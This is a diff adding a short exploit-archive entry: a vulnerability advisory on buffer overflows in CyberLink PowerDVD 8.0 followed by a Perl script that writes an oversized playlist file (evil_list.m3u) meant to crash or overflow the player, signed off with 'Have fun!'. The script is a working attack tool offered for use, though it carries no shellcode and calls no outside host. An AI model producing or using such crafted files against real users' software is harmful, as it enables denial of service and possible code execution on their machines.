@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/30341/info
+
+PowerDVD is prone to multiple buffer-overflow vulnerabilities because it fails to perform adequate boundary checks on user-supplied input.
+
+Successfully exploiting these issues may allow remote attackers to execute arbitrary code in the context of the application. Failed exploit attempts will cause denial-of-service conditions.
+
+PowerDVD 8.0 is vulnerable; prior versions may also be affected. 
+
+#!/usr/bin/perl
+#
+# CyberLink PowerDVD <= 8.0 Crafted PLS/M3U Playlist File Buffer Overflow Exploit
+# Coded by Gjoko "LiquidWorm" Krstic
+# liquidworm [At] gmail.com
+# http://www.zeroscience.org
+#
+
+$buffer = "J" x 520000;
+
+open(m3u, ">./evil_list.m3u"); # or .pls
+
+print m3u "$buffer";
+
+print "\n--> Evil Playlist created... Have fun!\n";
+
+# July, 2008
